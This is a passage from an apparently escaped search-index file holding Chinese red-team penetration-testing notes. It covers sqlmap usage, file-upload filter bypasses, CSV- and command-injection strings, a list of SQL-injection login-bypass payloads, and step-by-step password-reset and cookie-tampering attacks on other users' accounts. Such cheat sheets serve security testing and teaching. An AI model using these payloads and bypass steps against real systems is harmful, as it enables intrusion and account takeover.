-r\u8868\u793a\u52a0\u8f7d\u6587\u4ef6(\u53ca\u6b65\u9aa4\uff085\uff09\u4fdd\u5b58\u7684\u8def\u5f84)\uff0c-p\u6307\u5b9a\u53c2\u6570\uff08\u5373\u62e6\u622a\u7684post\u8bf7\u6c42\u4e2d\u8868\u5355\u63d0\u4ea4\u7684\u7528\u6237\u540d\u6216\u5bc6\u7801\u7b49name\u53c2\u6570\uff09 \uff087\uff09\u81ea\u52a8\u83b7\u53d6\u8868\u5355\uff1a--forms\u81ea\u52a8\u83b7\u53d6\u8868\u5355 \u4f8b\u5982\uff1asqlmap -u www.xx.com/login.asp --forms \uff088\uff09\u6307\u5b9a\u53c2\u6570\u641c\u7d22\uff1a--data \u4f8b\u5982:sqlmap -u www.xx.com/login.asp --data \"username=1\"","title":"3#\u3001POST\u6ce8\u5165\uff1a"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#4","text":"\\1. --purge \u3010\u91cd\u65b0\u626b\u63cf\uff08--purge \u5220\u9664\u539f\u5148\u5bf9\u8be5\u76ee\u6807\u626b\u63cf\u7684\u8bb0\u5f55\uff09 \\2. --tables \u3010\u83b7\u53d6\u8868\u540d \\3. --dbs \u3010\u68c0\u6d4b\u7ad9\u70b9\u5305\u542b\u54ea\u4e9b\u6570\u636e\u5e93 \\4. --current-db \u3010\u83b7\u53d6\u5f53\u524d\u7684\u6570\u636e\u5e93\u540d \\5. --current-user \u3010\u68c0\u6d4b\u5f53\u524d\u7528\u6237 \\6. --is-dba \u3010\u5224\u65ad\u7ad9\u70b9\u7684\u5f53\u524d\u7528\u6237\u662f\u5426\u4e3a\u6570\u636e\u5e93\u7ba1\u7406\u5458 \\7. --batch \u3010\u9ed8\u8ba4\u786e\u8ba4\uff0c\u4e0d\u8be2\u95ee\u4f60\u662f\u5426\u8f93\u5165 \\8. --search \u3010\u540e\u9762\u8ddf\u53c2\u6570 -D -T -C \u641c\u7d22\u5217\uff08C\uff09\uff0c\u8868\uff08T\uff09\u548c\u6216\u6570\u636e\u5e93\u540d\u79f0\uff08D\uff09 \\9. --threads 10 \u3010\u7ebf\u7a0b\uff0csqlmap\u7ebf\u7a0b\u6700\u9ad8\u8bbe\u7f6e\u4e3a10 \\10. --level 3 \u3010sqlmap\u9ed8\u8ba4\u6d4b\u8bd5\u6240\u6709\u7684GET\u548cPOST\u53c2\u6570\uff0c\u5f53--level\u7684\u503c\u5927\u4e8e\u7b49\u4e8e2\u7684\u65f6\u5019\u4e5f\u4f1a\u6d4b\u8bd5HTTP Cookie\u5934 \u200b \u7684\u503c\uff0c\u5f53\u5927\u4e8e\u7b49\u4e8e3\u7684\u65f6\u5019\u4e5f\u4f1a\u6d4b\u8bd5User-Agent\u548cHTTP Referer\u5934\u7684\u503c\u3002\u6700\u9ad8\u4e3a5 \\11. --risk 3 \u3010\u6267\u884c\u6d4b\u8bd5\u7684\u98ce\u9669\uff080-3\uff0c\u9ed8\u8ba4\u4e3a1\uff09risk\u8d8a\u9ad8\uff0c\u8d8a\u6162\u4f46\u662f\u8d8a\u5b89\u5168 \\12. -v \u3010\u8be6\u7ec6\u7684\u7b49\u7ea7(0-6) \u200b 0\uff1a\u53ea\u663e\u793aPython\u7684\u56de\u6eaf\uff0c\u9519\u8bef\u548c\u5173\u952e\u6d88\u606f\u3002 \u200b 1\uff1a\u663e\u793a\u4fe1\u606f\u548c\u8b66\u544a\u6d88\u606f\u3002 \u200b 2\uff1a\u663e\u793a\u8c03\u8bd5\u6d88\u606f\u3002 \u200b 3\uff1a\u6709\u6548\u8f7d\u8377\u6ce8\u5165\u3002 \u200b 4\uff1a\u663e\u793aHTTP\u8bf7\u6c42\u3002 \u200b 5\uff1a\u663e\u793aHTTP\u54cd\u5e94\u5934\u3002 \u200b 6\uff1a\u663e\u793aHTTP\u54cd\u5e94\u9875\u9762\u7684\u5185\u5bb9 \\13. --privileges \u3010\u67e5\u770b\u6743\u9650 \\14. --tamper xx.py,cc.py \u3010\u9632\u706b\u5899\u7ed5\u8fc7\uff0c\u540e\u63a5tamper\u5e93\u4e2d\u7684py\u6587\u4ef6 \\15. --method \"POST\" --data \"page=1&id=2\" \u3010POST\u65b9\u5f0f\u63d0\u4ea4\u6570\u636e \\16. --threads number\u3000\u3000\u3010\u91c7\u7528\u591a\u7ebf\u7a0b \u540e\u63a5\u7ebf\u7a0b\u6570 \\17. --referer \"\" \u3010\u4f7f\u7528referer\u6b3a\u9a97 \\18. --user-agent \"\" \u3010\u81ea\u5b9a\u4e49user-agent \\19. --proxy \u201c\u76ee\u6807\u5730\u5740\u2033 \u3010\u4f7f\u7528\u4ee3\u7406\u6ce8\u5165 sqlmap\u5e38\u7528\u8def\u5f84\uff1a \\1. \u6dfb\u52a0\u8868\u5b57\u6bb5\u7684\u76ee\u5f55\u5728/usr/share/sqlmap/txt/common-tables.txt \\2. \u5b58\u653e\u626b\u63cf\u8bb0\u5f55\u7684\u76ee\u5f55\u5728/root/.sqlmap/output \u9ad8\u9636\u73a9\u6cd5\uff1a \u81ea\u5df1\u5199tamper.py","title":"4#\u3001\u5e38\u7528\u6307\u4ee4\uff1a"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#22xss","text":"xss\u6f0f\u6d1e\u539f\u7406\u5206\u6790\u4e0e\u6316\u6398\u65b9\u6cd5 - \u77e5\u4e4e web\u6f0f\u6d1e | XSS\uff08\u8de8\u7ad9\u653b\u51fb\u811a\u672c\uff09\u8be6\u89e3 XSS\u6c47\u603b XSS\u5c0f\u7ed3 - \u5148\u77e5\u793e\u533a [2020\u8de8\u7ad9\u70b9\u811a\u672c xss]\u901f\u67e5\u8868|\u96e8\u82c1 XSSer\u81ea\u52a8\u5316\u5de5\u5177 XSStrike \u81ea\u52a8\u5316\u7ed5\u8fc7WAF xss payload\u5b57\u5178 burp\u7206\u7834 \u5ba2\u670d\u5bf9\u8bdd\u7cfb\u7edf\u4e0aXSS\u6253cookie \u642d\u5efaXSS\u5e73\u53f0","title":"2.2XSS\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff1a"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#23_1","text":"\u200b \u5b57\u5178\u751f\u6210 https://github.com/c0ny1/upload-fuzz-dic-builder \u200b \u7578\u5f62\u6587\u4ef6\u540d \u200b Windows \u200b shell.php{%80-%99} \u200b NTFS ADS\u7279\u6027 \u200b shell.php...... \u200b shell.php::$DATA \u200b shell.php:a.jpg \u200b \u76ee\u5f55\u7a7f\u8d8a \u200b \u4e0a\u4f20\u540e\u5982\u679c\u6ca1\u6709\u88ab\u6587\u4ef6\u91cd\u547d\u540d\uff0c\u53ef\u4ee5\u5728\u6587\u4ef6\u540d\u503c\u505a\u76ee\u5f55\u8df3\u8f6c \u200b \u6ce8\u610f\u4e00\u4e9b\u50cf\u76ee\u5f55\u7684\u53c2\u6570\u540d \u200b dir \u200b path \u200b location \u200b url \u200b \u6587\u4ef6\u5934\u7ed5\u8fc7 \u200b \u4fee\u6539\u4e0a\u4f20\u7c7b\u578b Content-Type \u53cc\u6587\u4ef6\u4e0a\u4f20 \u622a\u65ad \u2022 \u957f\u6587\u4ef6\u540d \u2022 \u957fContent-Disposition \u2022 %00\u622a\u65ad \u7279\u6b8a\u6587\u4ef6 \u2022 svg / html / htm / swf \u2022 xss \u2022 pdf \u2022 chrome \u91cc\u53ef\u4ee5\u8df3\u8f6c cer / asa / spx / php5 / phtml \u2022 \u53ef\u80fd\u4f1a\u88ab\u5f53\u505a\u52a8\u6001\u8bed\u8a00\u89e3\u6790 .htaccess / .user.ini / web.config / web.xml \u2022 \u4fee\u6539\u89e3\u6790\u89c4\u5219 .xls / .xlsx \u2022 POI Excel XXE .tar / .tar.gz / .zip \u2022 \u53ef\u80fd\u5b58\u5728\u6587\u4ef6\u91ca\u653e\u76ee\u5f55\u8df3\u8f6c\u95ee\u9898 .pkl \u2022 python\u53cd\u5e8f\u5217\u5316\u6587\u4ef6 .xml \u2022 \u53ef\u80fd\u6709 XXE .yaml / .yml \u2022 YAML \u53cd\u5e8f\u5217\u5316 .jar / .class \u2022 \u4e0a\u4f20\u5230 java classpath \u7684\u76ee\u5f55\u4e0b\uff0c\u7c7b\u88ab\u52a0\u8f7d\u65f6\u6267\u884c\u4ee3\u7801 \u65e0\u5927\u5c0f\u548c\u6b21\u6570\u9650\u5236 \u2022 \u65e0\u9650\u4e0a\u4f20\u5236\u9020\u5783\u573e\u6570\u636e\u5835\u6b7b\u786c\u76d8 \u6709\u56fe\u7247\u52a0\u5de5\u7684\u5730\u65b9\u53ef\u4ee5\u6ce8\u610f\u4e00\u4e0bimagemagick\u547d\u4ee4\u6267\u884c \u6587\u4ef6\u8bfb\u53d6 \u8bfb\u53d6\u7cfb\u7edf\u654f\u611f\u6587\u4ef6 \u6587\u4ef6\u5305\u542b \u53ef\u8bfb\u53d6\u6587\u4ef6\u6216\u4ee3\u7801\u6267\u884c \u6587\u4ef6\u5220\u9664 \u5220\u9664\u914d\u7f6e\u6587\u4ef6\u53ef\u7834\u574f\u7f51\u7ad9 \u5220\u9664\u5b89\u88c5\u9501\u53ef\u91cd\u88c5 \u6587\u4ef6\u89e3\u538b \u5982\u679c\u4e0a\u4f20\u6587\u4ef6\u4e3a tar / tar.gz \u7c7b\u578b\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u6784\u538b\u7f29\u5305\u5185\u6587\u4ef6\u540d\u4e3a../../../../xxx \u7684tar\u5305 \u6587\u4ef6\u5bfc\u51fa \u5982\u679c\u662fCSV \u6216\u8005 Excel\u53ef\u4ee5\u6ce8\u610f\u4e00\u4e0bCSV\u6ce8\u5165 =2222-1 -1+1=2222-1 @=2222-1 \\r\\n=2222-1 111,=2222-1,","title":"2.3\u6587\u4ef6\u4e0a\u4f20"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#24","text":"\u2022 \u547d\u4ee4\u6ce8\u5165 \u2022 --xxxx \u53c2\u6570\u6ce8\u5165 \u2022 | \u548c | | \u4e0e\u7b26\u53f7 \u2022 & \u548c && \u4e0e\u7b26\u53f7 \u2022 ; \u5206\u53f7 \u2022 ${} \u4ee3\u7801\u6267\u884c \u2022 \u8868\u8fbe\u5f0f \u2022 freemarker \u2022 OGNL \u2022 Spel \u2022 jsel \u2022 \u975e\u8868\u8fbe\u5f0f \u2022 php \u2022 eval \u2022 assert \u2022 call_user_func() / call_user_func_array() \u2022 preg_replace() \u2022 create_function() \u2022 array_map() \u2022 array_filter() \u2022 usort() / uasort() \u2022 \u53cd\u5e8f\u5217\u5316 \u2022 php \u6e90\u6587\u4ef6\u62fc\u63a5\u5199\u5165 \u2022 java \u2022 \u53cd\u5e8f\u5217\u5316 \u2022 \u8fdc\u7a0b jar \u52a0\u8f7d \u2022 \u53cd\u5c04\u673a\u5236 \u2022 jsp \u6e90\u6587\u4ef6\u62fc\u63a5\u5199\u5165","title":"2.4\u547d\u4ee4\u6267\u884c"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#25","text":"\u540e\u53f0\u5f31\u53e3\u4ee4\u7206\u7834\u649e\u5e93\uff08\u5c1d\u8bd5\u4e07\u80fd\u5bc6\u7801\u3001\u7279\u5b9a\u8d44\u4ea7\u5e38\u7528\u5bc6\u7801\u3001\u5f31\u53e3\u4ee4\u540e\u518d\u649e\u5e93\uff09 asp aspx\u4e07\u80fd\u5bc6\u7801 1\uff1a \"or \"a\"=\"a 2\uff1a ')or('a'='a 3\uff1aor 1=1-- 4\uff1a'or 1=1-- 5\uff1aa'or' 1=1-- 6\uff1a \"or 1=1-- 7\uff1a'or'a'='a 8\uff1a \"or\"=\"a'='a 9\uff1a'or''=' 10\uff1a'or'='or' 11: 1 or '1'='1'=1 12: 1 or '1'='1' or 1=1 13: 'OR 1=1%00 14: \"or 1=1%00 15: 'xor 16: \u65b0\u578b\u4e07\u80fd\u767b\u9646\u5bc6\u7801 \u7528\u6237\u540d ' UNION Select 1,1,1 FROM admin Where ''=' \uff08\u66ff\u6362\u8868\u540dadmin\uff09 \u5bc6\u7801 1 Username=-1%cf' union select 1,1,1 as password,1,1,1 %23 Password=1 17..admin' or 'a'='a \u5bc6\u7801\u968f\u4fbf PHP\u4e07\u80fd\u5bc6\u7801 'or'='or' 'or 1=1/* \u5b57\u7b26\u578b GPC\u662f\u5426\u5f00\u90fd\u53ef\u4ee5\u4f7f\u7528 User: something Pass: ' OR '1'='1 jsp \u4e07\u80fd\u5bc6\u7801 1'or'1'='1 admin' OR 1=1/* \u7528\u6237\u540d\uff1aadmin \u7cfb\u7edf\u5b58\u5728\u8fd9\u4e2a\u7528\u6237\u7684\u65f6\u5019 \u624d\u7528\u5f97\u4e0a \u5bc6\u7801\uff1a1'or'1'='1 pydictor\u3001cupp\u3001crunch\u5b57\u5178\u751f\u6210\u5de5\u5177\u3001\u81ea\u5199\u5b57\u5178\u751f\u6210py\uff08\u5c0f\u9ed1\u7684\u4eba\u540d\u5b57\u5178py\uff09\uff1b dymerge\u5b57\u5178\u5408\u5e76\u53bb\u91cd\u5de5\u5177\u3001\u81ea\u5df1\u5199\u53bb\u91cdpy\uff1b hydra\u7206\u7834\u5de5\u5177 \u8d85\u7ea7\u5f31\u53e3\u4ee4\u68c0\u9a8c\u5de5\u5177 burpsuite \u7206\u7834 \u4f7f\u7528\u5f31\u7528\u6237\u540d\u5bf9\u5bc6\u7801\u8fdb\u884c\u66b4\u529b\u7834\u89e3 \u4f7f\u7528\u5f31\u53e3\u4ee4\u5bc6\u7801\u5bf9\u7528\u6237\u540d\u8fdb\u884c\u66b4\u529b\u7834\u89e3","title":"2.5\u5f31\u53e3\u4ee4\u53ca\u5b57\u5178\u7834\u89e3"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#26","text":"","title":"2.6\u903b\u8f91\u6f0f\u6d1e"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#cookie","text":"\u4e00\u4e9b\u7f51\u7ad9\u4f1a\u5229\u7528 Cookie \u662f\u5426\u4e3a\u7a7a\u3001Session \u662f\u5426\u4e3a true \u6765\u5224\u65ad\u7528\u6237\u662f\u5426\u53ef\u4ee5\u767b\u5f55\uff0c\u53ea\u8981\u6784\u9020\u4e00\u4e2a Cookie \u6216 Session \u4e3a true \u5c31\u53ef\u4ee5\u7ed5\u8fc7\u8ba4\u8bc1\u767b\u5f55 \u901a\u8fc7\u4fee\u6539 Cookie \u4e2d\u7684\u67d0\u4e2a\u53c2\u6570\u6765\u5b9e\u73b0\u767b\u5f55\u5176\u4ed6\u7528\u6237,\u8981\u6293\u5305\u5177\u4f53\u5206\u6790 \u6570\u636e\u7be1\u6539 \u6570\u91cf\u3001\u91d1\u989d\u3001ID\u3001\u90ae\u7bb1\u7b49\u6570\u636e\uff1a\u6700\u5927\u8d85\u8fc7\u9650\u5236\u3001\u8d1f\u6570\u30010\u3001\u5176\u4ed6\u7528\u6237\u6570\u636e\uff0c\u63d0\u4ea4\u540e\u67e5\u770b\u662f\u5426\u8fdb\u5165\u6b63\u5e38\u4e1a\u52a1\u6d41\u7a0b\uff0c\u662f\u5426\u5b58\u5728\u8d8a\u6743 \u4f8b\u5b50\uff1a \u4fee\u6539\u666e\u901a\u7528\u6237\u5bc6\u7801\uff0c\u6293\u5305 \u5c06 Referer \u548c POST \u4e2d\u7684\u666e\u901a\u7528\u6237\u6539\u6210 admin \u63d0\u4ea4\u6570\u636e\u540e\uff0c\u76f4\u63a5\u8fd4\u56de\u4e86 admin \u7684\u5bc6\u7801\u4fee\u6539\u9875\u9762\uff0c\u5229\u7528\u903b\u8f91\u6f0f\u6d1e\u83b7\u53d6\u8d85\u7ea7\u6743\u9650 \u6293\u5305\u4fee\u6539\u624b\u673a\u53f7\u53c2\u6570\u4e3a\u5176\u4ed6\u53f7\u7801\u8fdb\u884c\u5c1d\u8bd5\uff0c\u4f8b\u5982\u529e\u7406\u67e5\u8be2\u9875\u9762\uff0c\u8f93\u5165\u81ea\u5df1\u7684\u53f7\u7801\u7136\u540e\u6293\u5305\uff0c\u4fee\u6539\u624b\u673a\u53f7\u4e3a\u4ed6\u4eba\u53f7\u7801\uff0c\u67e5\u770b\u662f\u5426\u53ef\u4ee5\u67e5\u8be2\u4ed6\u4eba\u4e1a\u52a1 \u624b\u673a\u53f7 \u7be1\u6539 \u90ae\u7bb1\u6216\u8005\u7528\u6237 \u7be1\u6539 \u8ba2\u5355ID \u7be1\u6539 \u5546\u54c1\u7f16\u53f7 \u7be1\u6539 \u7528\u6237ID \u7be1\u6539 \u91d1\u989d \u7be1\u6539 \u5546\u54c1\u6570\u91cf \u7be1\u6539","title":"Cookie"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#_3","text":"drop\u6389\u9875\u9762 \u8fd4\u56de\u5305\u91cc\u53ef\u80fd\u5c31\u6709\u9a8c\u8bc1\u7801 \u4e00\u6b21\u9a8c\u8bc1\u7801\u591a\u7528 \u9a8c\u8bc1\u7801\u8bc6\u522b\u63d2\u4ef6\uff0cburp \u6ce8\u518c\u754c\u9762\uff1a \u200b \u4efb\u610f\u7528\u6237\u6ce8\u518c \u200b \u53ef\u7206\u7834\u7528\u6237\u540d \u200b \u6ce8\u5165 \u200b XSS \u767b\u5f55\u754c\u9762 \uff1a \u200b \u7206\u7834\u7528\u6237\u540d\u3001\u5bc6\u7801 \u200b \u6ce8\u5165 \u200b \u4e07\u80fd\u5bc6\u7801 \u200b Xss Xss+Csrf \u200b \u4fee\u6539\u8fd4\u56de\u5305\u4fe1\u606f\uff0c\u767b\u5165\u4ed6\u4eba\u8d26\u6237 \u200b \u4fee\u6539cookie\u4e2d\u7684\u53c2\u6570\uff0c\u5982user,adminid\u7b49 \u5fd8\u8bb0\u5bc6\u7801\u754c\u9762 \uff1a \u4efb\u610f\u5bc6\u7801\u91cd\u7f6e\u6982\u8981\uff1a \u200b 1\uff0e\u91cd\u7f6e\u4e00\u4e2a\u8d26\u6237\uff0c\u4e0d\u53d1\u9001\u9a8c\u8bc1\u7801\uff0c\u8bbe\u7f6e\u9a8c\u8bc1\u7801\u4e3a\u7a7a\u53d1\u9001\u8bf7\u6c42\u3002 \u200b 2\uff0e\u53d1\u9001\u9a8c\u8bc1\u7801\uff0c\u67e5\u770b\u76f8\u5e94\u5305 \u200b 3\uff0e\u9a8c\u8bc1\u7801\u751f\u5b58\u671f\u7684\u7206\u7834 \u200b 4\uff0e\u4fee\u6539\u76f8\u5e94\u5305\u4e3a\u6210\u529f\u7684\u76f8\u5e94\u5305 \u200b 5\uff0e\u624b\u5de5\u76f4\u63a5\u8df3\u8f6c\u5230\u6821\u9a8c\u6210\u529f\u7684\u754c\u9762 \u200b 6\uff0e\u4e24\u4e2a\u8d26\u6237\uff0c\u91cd\u7f6e\u522b\u4eba\u5bc6\u7801\u65f6\uff0c\u66ff\u6362\u9a8c\u8bc1\u7801\u4e3a\u81ea\u5df1\u6b63\u786e\u7684\u9a8c\u8bc1\u7801 \u200b 7\uff0e\u91cd\u7f6e\u522b\u4eba\u5bc6\u7801\u65f6\uff0c\u66ff\u6362\u4e3a\u81ea\u5df1\u7684\u624b\u673a\u53f7 \u200b 8\uff0e\u91cd\u7f6e\u81ea\u5df1\u7684\u6210\u529f\u65f6\uff0c\u540c\u610f\u6d4f\u89c8\u5668\u91cd\u7f6e\u522b\u4eba\u7684\uff0c\u4e0d\u53d1\u9a8c\u8bc1\u7801 \u200b 9\uff0e\u66ff\u6362\u7528\u6237\u540d\uff0cID\uff0ccookie\uff0ctoken\u53c2\u6570\u7b49\u9a8c\u8bc1\u8eab\u4efd\u7684\u53c2\u6570 10\uff0e\u901a\u8fc7\u8d8a\u6743\u4fee\u6539\u4ed6\u4eba\u7684\u627e\u56de\u4fe1\u606f\u5982\u624b\u673a/\u90ae\u7bb1\u6765\u91cd\u7f6e \u7528\u6237\u51ed\u8bc1\u66b4\u529b\u7834\u89e3 \uff08\u9a8c\u8bc1\u7801\uff09 \u7ed5\u8fc7\u7684\u8bdd\uff0c\u8fd9\u91cc\u53ef\u4ee5\u8003\u8651\u4e00\u4e2a\u73b0\u72b6\uff1a \u4f8b\u5982\uff1a phone=18888888888abc \u56fd\u5185\u5f88\u591a\u60c5\u51b5\u4e0b\u90fd\u6ca1\u6709\u8fc7\u6ee4\u5b57\u7b26\u548c\u9650\u5236\u8f93\u51fa\u957f\u5ea6\uff0c\u9a8c\u8bc1\u5f88\u6709\u53ef\u80fd\u53ea\u662f\u7b80\u5355\u7684\u5904\u7406 \u53ea\u8981\u66f4\u6362\u624b\u673a\u53f7\u540e\u9762\u7684\u5b57\u7b26\uff0c\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u8bf7\u6c42\u8fc7\u4e8e\u9891\u7e41\u7684\u9650\u5236 \u4f46\u662f\u6821\u9a8c\u65f6\uff0c\u624b\u673a\u53f7\u540e\u9762\u7684\u5b57\u7b26\u4f1a\u88ab\u8fc7\u6ee4\uff0c\u4e5f\u5c31\u662f\u53ef\u4ee5\u5229\u7528\u66b4\u529b\u7834\u89e3\u9a8c\u8bc1\u7801\uff08\u4e0d\u8ba1\u5165\u6b21\u6570\uff09 \u6240\u4ee5\u53ea\u8981\u5728\u66b4\u529b\u7834\u89e3\u7684\u540c\u65f6\uff0c\u6539\u53d8\u624b\u673a\u53f7\u540e\u9762\u7684\u5b57\u7b26\u5373\u53ef\u8fbe\u5230\u6f0f\u6d1e\u6548\u679c \u6839\u636e\u624b\u673a\u53f7\u627e\u56de\u5bc6\u7801\uff0c\u4f46\u662f\u9a8c\u8bc1\u6b21\u6570\u88ab\u9650\u5236\uff0c\u6293\u5305 \u53ef\u4ee5\u5c1d\u8bd5\u5728\u624b\u673a\u53f7\u540e\u9762\u6dfb\u52a0\u4e0d\u4e3a\u6570\u5b57\u7684\u5b57\u7b26\uff0c\u67e5\u770b\u662f\u5426\u8fc7\u6ee4 \u6839\u636e\u624b\u673a\u53f7\u627e\u56de\u5bc6\u7801\uff0c\u968f\u4fbf\u8f93\u4e2a\u9a8c\u8bc1\u7801\uff0c\u6293\u5305 \u66b4\u529b\u7834\u89e3\u9a8c\u8bc1\u7801\uff08\u5047\u5982\u53ea\u6709\u56db\u4f4d\uff09\uff0c\u5f88\u5feb\u5c31\u53ef\u4ee5\u7834\u89e3\u51fa\u6765 \u56db\u4f4d\u6216\u516d\u4f4d\u7eaf\u6570\u5b57\uff0c\u9a8c\u8bc1\u7801\u6b21\u6570\u672a\u9650\u5236 \u4f8b\u5982\uff1a \u5982\u679c\u9a8c\u8bc1\u7801\u6b21\u6570\u9650\u5236\uff0c\u7834\u89e3\u4e00\u4f1a\u5c31\u4f1a\u63d0\u793a\u8bf7\u6c42\u8fc7\u4e8e\u9891\u7e41\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u7ed5\u8fc7\u9650\u5236 \u4f8b\u5982\uff1a \u901a\u8fc7\u5bc6\u4fdd\u95ee\u9898\u627e\u56de\u5bc6\u7801\uff0c\u67e5\u770b\u6e90\u7801\uff0c\u5bc6\u4fdd\u95ee\u9898\u548c\u7b54\u6848\u5c31\u5728\u6e90\u7801\u4e2d\u663e\u793a \u8fd4\u56de\u51ed\u8bc1\uff08\u9a8c\u8bc1\u7801 \u53ca token\uff09\u3001\u90ae\u7bb1\u5f31 token\u3001\u7528\u6237\u51ed\u8bc1\u6709\u6548\u6027\u3001\u91cd\u65b0\u7ed1\u5b9a \u6293\u5305\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd4\u56de\u7684\u6570\u636e\u4e2d\u6709\u4e00\u4e2a\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\uff08token\uff09\uff0c\u5148\u8bb0\u5f55\u4e0b\u8fd9\u4e2a\u52a0\u5bc6\u5b57\u7b26\u4e32 \u7ee7\u7eed\u6309\u7167\u6b63\u5e38\u6d41\u7a0b\uff0c\u767b\u5f55\u90ae\u7bb1\u83b7\u5f97\u9a8c\u8bc1\u7801\uff0c\u8fd4\u56de\u586b\u5199\u9a8c\u8bc1\u7801\u540e\uff0c\u8fdb\u5165\u4e0b\u4e00\u4e2a\u586b\u5199\u65b0\u5bc6\u7801\u9875\u9762\uff0c\u53d1\u73b0 URL \u540e\u65b0\u589e\u4e86\u4e00\u4e2a\u52a0\u5bc6\u9a8c\u8bc1\u7684\u5b57\u7b26\u4e32 \u8fd9\u4e2a\u5b57\u7b26\u4e32\u5c31\u662f\u4e4b\u524d\u6570\u636e\u5305\u4e2d\u8bb0\u5f55\u7684\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u90ae\u7bb1\u9a8c\u8bc1\u7801\u8fd9\u4e2a\u73af\u8282\u53ef\u4ee5\u7ed5\u8fc7\uff0c\u76f4\u63a5\u7528\u4ed6\u4eba\u90ae\u7bb1\u6293\u5305\u83b7\u5f97\u52a0\u5bc6\u5b57\u7b26\u4e32\u5c31\u53ef\u4ee5\u91cd\u7f6e\u4ed6\u4eba\u5bc6\u7801 \u6839\u636e\u624b\u673a\u53f7\u627e\u56de\u5bc6\u7801\uff0c\u6293\u5305\uff0c\u53ef\u4ee5\u53d1\u73b0\u9a8c\u8bc1\u7801\u76f4\u63a5\u663e\u793a verifycode=xxxx\uff0c\u6216\u8005\u7531 md5 \u52a0\u5bc6\u540e\u663e\u793a\uff0c\u89e3\u5bc6\u5373\u53ef\uff08\u540c\u7406\uff0c\u6709\u7684\u65f6\u5019\u8f93\u5165\u7528\u6237\u540d\uff0c\u6293\u5305\u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u7684\u624b\u673a\u53f7\u7b49\u5176\u4ed6\u4fe1\u606f\uff09 \u6839\u636e\u90ae\u7bb1\u627e\u56de\u5bc6\u7801,\u6293\u5305\u76f4\u63a5\u8fd4\u56de,\u5bc6\u7801\u627e\u56de\u51ed\u8bc1\u53ef\u80fd\u5728\u9875\u9762\u4e2d \u4f8b\u5982\uff1a \u5229\u7528\u4e24\u4e2a\u5e10\u53f7\u540c\u65f6\u70b9\u51fb\u627e\u56de\u5bc6\u7801\uff0c\u53bb\u90ae\u7bb1\u67e5\u770b\u627e\u56de\u5bc6\u7801\u7684\u94fe\u63a5\uff0c\u53d1\u73b0\u4e24\u8005\u7684\u968f\u673a token \u53ea\u5dee 1-2\uff0c\u800c\u4e14\u53ef\u4ee5\u731c\u6d4b\u51fa\u4e3a\u670d\u52a1\u5668\u65f6\u95f4 \u6240\u4ee5\u53ef\u4ee5\u7528\u4e00\u4e2a\u672a\u77e5\u5e10\u53f7\u548c\u4e00\u4e2a\u5df2\u77e5\u5e10\u53f7\u540c\u65f6\u70b9\u51fb\u627e\u56de\u5bc6\u7801\uff0c\u7a0d\u5fae\u904d\u5386\u4e00\u4e0b\u968f\u673a token\uff0c\u5c31\u53ef\u4ee5\u6784\u9020\u51fa\u672a\u77e5\u5e10\u53f7\u7684\u5bc6\u7801\u627e\u56de\u94fe\u63a5 \u4f8b\u5982\uff1a \u901a\u8fc7\u90ae\u7bb1\u627e\u56de\u5bc6\u7801\uff0c\u6b63\u5e38\u6d41\u7a0b\u53bb\u90ae\u7bb1\u67e5\u770b\u91cd\u7f6e\u5bc6\u7801\u94fe\u63a5\uff0c\u53d1\u73b0\u94fe\u63a5\u5904\u6709\u4e00\u4e32 md5 \u52a0\u5bc6\u5b57\u7b26\u4e32 \u5b57\u7b26\u4e32\u89e3\u5bc6\uff0c\u7c7b\u4f3c 1491293277\uff0810\u4f4d\uff09\uff0c\u53ef\u4ee5\u5224\u65ad\u4e3a Unix\u65f6\u95f4\u6233\uff0c\uff08\u53ef\u80fdmd5\uff09 \u91cd\u7f6e\u4ed6\u4eba\u5bc6\u7801\u53ea\u9700\u8981\u5229\u7528\u4ed6\u4eba\u90ae\u7bb1\u53d1\u9001\u91cd\u7f6e\u5bc6\u7801\u90ae\u7bb1\uff0c\u5728\u77ed\u65f6\u95f4\u5185\u5bf9 Unix\u65f6\u95f4\u6233 \u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u5373\u53ef\u83b7\u5f97\u91cd\u7f6e\u5bc6\u7801\u7684\u94fe\u63a5 \u91cd\u7f6e\u5bc6\u7801\u94fe\u63a5\u76f4\u63a5\u4f7f\u7528\u7528\u6237\u540d\u6765\u533a\u522b\uff0c\u6539\u53d8\u7528\u6237\u540d\u5373\u53ef\u66f4\u6539\u4ed6\u4eba\u5bc6\u7801 \u7ed5\u8fc7**token** \u6b63\u5e38\u6d41\u7a0b\u4e0b\uff0c\u5bf9\u6bcf\u4e2a\u529f\u80fd\u6a21\u5757\u8fdb\u884c\u6293\u5305\uff0c\u5206\u522b\u662f\u53d1\u9001\u9a8c\u8bc1\u7801\uff0c\u9a8c\u8bc1\u9a8c\u8bc1\u7801\u662f\u5426\u6b63\u786e\uff0c\u83b7\u53d6 token\uff0c\u91cd\u7f6e\u5bc6\u7801 \u63a5\u4e0b\u6765\uff0c\u7528\u4ed6\u4eba\u5e10\u53f7\u901a\u8fc7\u90ae\u7bb1\u9a8c\u8bc1\uff0c\u6293\u5305\uff0c\u5c06\u5176\u4e2d Cookie \u5185\u4ece JSESSIONID 